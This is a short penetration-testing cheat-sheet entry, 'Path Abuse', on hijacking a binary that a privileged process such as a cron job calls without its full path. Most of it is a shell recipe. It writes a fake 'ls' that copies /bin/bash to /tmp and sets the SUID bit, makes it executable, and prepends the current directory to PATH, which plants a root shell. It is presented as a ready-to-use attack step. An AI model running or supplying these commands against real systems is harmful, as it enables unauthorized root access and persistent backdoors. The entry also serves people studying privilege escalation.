# Path Abuse

If a binary is being run by a privileged user (ex cron job) and the full path to the binary is not used to refer to it, we can create a file with the same name, put our command inside it and add our current directory to the `PATH`, so that our file is being executed instead of the intended binary

```shellscript
# Here is an example if the binary being run was ls
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > ls

# Make the file executale
chmod +x ls

# Check the path
echo $PATH

# Update the PATH variable
export PATH=$(pwd):$PATH
```
